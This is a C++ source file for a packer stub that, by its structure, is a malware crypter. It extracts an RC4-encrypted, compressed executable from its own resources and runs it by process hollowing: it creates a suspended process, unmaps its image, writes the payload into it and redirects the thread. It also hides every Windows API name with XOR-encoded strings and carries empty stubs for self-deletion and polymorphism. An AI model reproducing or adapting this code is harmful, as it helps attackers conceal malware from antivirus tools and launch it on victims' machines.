#include <Windows.h>

#include "packerstub.hpp"

typedef BOOL(WINAPI *pfnCreateProcessW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironemnt, LPCWSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProccessInformation);
typedef BOOL(WINAPI *pfnGetThreadContext)(HANDLE hThread, PCONTEXT lpContext);
typedef LPVOID(WINAPI *pfnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI *pfnWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
typedef BOOL(WINAPI *pfnSetThreadContext)(HANDLE hThread, CONTEXT *lpContext);
typedef DWORD(WINAPI *pfnResumeThread)(HANDLE hThread);
typedef DWORD(WINAPI *pfnWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliSeconds);
typedef BOOL(WINAPI *pfnCloseHandle)(HANDLE hObject);

bool Packerstub::SelfDelete(std::wstring fileName) {
	return false;
}

bool Packerstub::UpdatePayload(std::wstring fileName) {
	return false;
}

Packerstub::Packerstub() {
	this->lpPayload = new PAYLOAD;
	qlz = new Quicklz();

	unsigned char key[] = "\x50\x25\xAB\xC4\x9D\x2E\xDD\x61\xF4";
	sx = new StringXor(key, 9);
}

Packerstub::~Packerstub() {
	delete(qlz);
	delete(rc4);
	delete[] this->lpPayload->lpBuffer;
	delete(this->lpPayload);
}

bool Packerstub::ExtractPayload() {
	HRSRC hRsrc = ::FindResource(NULL, MAKEINTRESOURCE(BUFFER_RSRC_ID), RT_RCDATA);
	if (hRsrc == NULL)
		return false;
	this->lpPayload->dwBufSize = ::SizeofResource(NULL, hRsrc);

	// get pointer to resource buffer
	HGLOBAL hGlobal = ::LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
		return false;

	this->lpPayload->lpBuffer = (LPBYTE)::LockResource(hGlobal);
	if (this->lpPayload->lpBuffer == NULL)
		return false;

	// get actual file size resource
	hRsrc = ::FindResource(NULL, MAKEINTRESOURCE(FILE_SIZE_RSRC_ID), RT_RCDATA);
	if (hRsrc == NULL)
		return false;

	// get file size value
	hGlobal = ::LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
		return false;
	this->lpPayload->dwFileSize = *(LPDWORD)::LockResource(hGlobal);

	// get decryption key
	hRsrc = ::FindResource(NULL, MAKEINTRESOURCE(KEY_RSRC_ID), RT_RCDATA);
	if (hRsrc == NULL)
		return false;

	// get pointer to key buffer
	hGlobal = ::LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
		return false;

	this->lpPayload->lpKey = (LPBYTE)::LockResource(hGlobal);
	if (this->lpPayload->lpKey == NULL)
		return false;

	rc4 = new Rc4(this->lpPayload->lpKey);

	return true;
}

void Packerstub::DecryptPayload() {
	LPBYTE lpDecryptBuffer = new BYTE[lpPayload->dwBufSize];
	
	memcpy(lpDecryptBuffer, lpPayload->lpBuffer, lpPayload->dwBufSize);

	this->rc4->Decrypt(lpDecryptBuffer, lpPayload->dwBufSize);

	lpPayload->lpBuffer = lpDecryptBuffer;
}

void Packerstub::DecompressPayload() {
	LPBYTE lpDecompressedBuffer = new(std::nothrow) BYTE[this->qlz->GetDecompressedSize(this->lpPayload->lpBuffer)];
	
	size_t nOutlen;
	this->qlz->Decompress(lpDecompressedBuffer, this->lpPayload->lpBuffer, nOutlen);

	delete[] this->lpPayload->lpBuffer;

	lpPayload->lpBuffer = lpDecompressedBuffer;
	lpPayload->dwBufSize = nOutlen;
}

bool Packerstub::ExecutePayload() {
	// get file name
	WCHAR szFileName[MAX_PATH];
	::GetModuleFileName(NULL, szFileName, MAX_PATH);

	// first extract header info 
	// check if valid DOS header
	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)this->lpPayload->lpBuffer;
	//if (pidh->e_magic != IMAGE_DOS_SIGNATURE)
	//	return false;

	// check if valid pe file
	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)this->lpPayload->lpBuffer + pidh->e_lfanew);
	if (pinh->Signature != IMAGE_NT_SIGNATURE)
		return false;

	// process info
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	// first create process as suspended
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));
	si.cb = sizeof(si);
	pfnCreateProcessW fnCreateProcessW = (pfnCreateProcessW)GetProcAddress(LoadLibrary(this->sx->WideCharXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x3b\x40\xd9\xaa\xf8\x42\xee\x53\xf4")), 9).c_str()), this->sx->MultibyteXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x13\x57\xce\xa5\xe9\x4b\x8d\x13\x9b\x33\x40\xd8\xb7\xca\x2e")), 15).c_str());
	if (!fnCreateProcessW(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
		return false;

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	pfnGetThreadContext fnGetThreadContext = (pfnGetThreadContext)GetProcAddress(LoadLibrary(this->sx->WideCharXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x3b\x40\xd9\xaa\xf8\x42\xee\x53\xf4")), 9).c_str()), this->sx->MultibyteXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x17\x40\xdf\x90\xf5\x5c\xb8\x00\x90\x13\x4a\xc5\xb0\xf8\x56\xa9\x61")), 17).c_str());
	if (!fnGetThreadContext(pi.hThread, &ctx))
		return false;

	// unmap memory space for our process
	pfnZwUnmapViewOfProcess fnZwUnmapViewOfSection = (pfnZwUnmapViewOfProcess)GetProcAddress(::GetModuleHandle(this->sx->WideCharXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x3e\x51\xcf\xa8\xf1\x2e")), 6).c_str()), this->sx->MultibyteXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x0a\x52\xfe\xaa\xf0\x4f\xad\x37\x9d\x35\x52\xe4\xa2\xce\x4b\xbe\x15\x9d\x3f\x4b\xab")), 21).c_str());
	fnZwUnmapViewOfSection(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase);

	// allocate virtual space for process
	pfnVirtualAllocEx fnVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddress(LoadLibrary(this->sx->WideCharXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x3b\x40\xd9\xaa\xf8\x42\xee\x53\xf4")), 9).c_str()), this->sx->MultibyteXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x06\x4c\xd9\xb0\xe8\x4f\xb1\x20\x98\x3c\x4a\xc8\x81\xe5\x2e")), 15).c_str());
	LPVOID lpAddress = fnVirtualAllocEx(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAddress == NULL)
		return false;

	// write headers into memory
	pfnWriteProcessMemory fnWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddress(LoadLibrary(this->sx->WideCharXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x3b\x40\xd9\xaa\xf8\x42\xee\x53\xf4")), 9).c_str()), this->sx->MultibyteXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x07\x57\xc2\xb0\xf8\x7e\xaf\x0e\x97\x35\x56\xd8\x89\xf8\x43\xb2\x13\x8d\x50")), 19).c_str());
	if (!fnWriteProcessMemory(pi.hProcess, (PVOID)pinh->OptionalHeader.ImageBase, this->lpPayload->lpBuffer, pinh->OptionalHeader.SizeOfHeaders, NULL))
		return false;

	// write each section into memory
	for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
		// calculate section header of each section
		PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD)this->lpPayload->lpBuffer + pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
		// write section data into memory
		fnWriteProcessMemory(pi.hProcess, (PVOID)(pinh->OptionalHeader.ImageBase + pish->VirtualAddress), (LPVOID)((DWORD)this->lpPayload->lpBuffer + pish->PointerToRawData), pish->SizeOfRawData, NULL);
	}

	// set starting address at virtual address: address of entry point
	ctx.Eax = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
	pfnSetThreadContext fnSetThreadContext = (pfnSetThreadContext)GetProcAddress(LoadLibrary(this->sx->WideCharXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x3b\x40\xd9\xaa\xf8\x42\xee\x53\xf4")), 9).c_str()), this->sx->MultibyteXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x03\x40\xdf\x90\xf5\x5c\xb8\x00\x90\x13\x4a\xc5\xb0\xf8\x56\xa9\x61")), 17).c_str());
	if (!fnSetThreadContext(pi.hThread, &ctx))
		return false;

	// resume our suspended processes
	pfnResumeThread fnResumeThread = (pfnResumeThread)GetProcAddress(LoadLibrary(this->sx->WideCharXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x3b\x40\xd9\xaa\xf8\x42\xee\x53\xf4")), 9).c_str()), this->sx->MultibyteXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x02\x40\xd8\xb1\xf0\x4b\x89\x09\x86\x35\x44\xcf\xc4")), 13).c_str());
	if (fnResumeThread(pi.hThread) == -1)
		return false;

	pfnWaitForSingleObject fnWaitForSingleObject = (pfnWaitForSingleObject)GetProcAddress(LoadLibrary(this->sx->WideCharXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x3b\x40\xd9\xaa\xf8\x42\xee\x53\xf4")), 9).c_str()), this->sx->MultibyteXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x07\x44\xc2\xb0\xdb\x41\xaf\x32\x9d\x3e\x42\xc7\xa1\xd2\x4c\xb7\x04\x97\x24\x25")), 20).c_str());
	fnWaitForSingleObject(pi.hProcess, INFINITE);

	pfnCloseHandle fnCloseHandle = (pfnCloseHandle)GetProcAddress(LoadLibrary(this->sx->WideCharXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x3b\x40\xd9\xaa\xf8\x42\xee\x53\xf4")), 9).c_str()), this->sx->MultibyteXor(reinterpret_cast<unsigned char *>(const_cast<char *>("\x13\x49\xc4\xb7\xf8\x66\xbc\x0f\x90\x3c\x40\xab")), 12).c_str());
	fnCloseHandle(pi.hProcess);
	fnCloseHandle(pi.hThread);

	return true;
}

bool Packerstub::PolymorphPayload(std::wstring fileName) {
	return false;
}
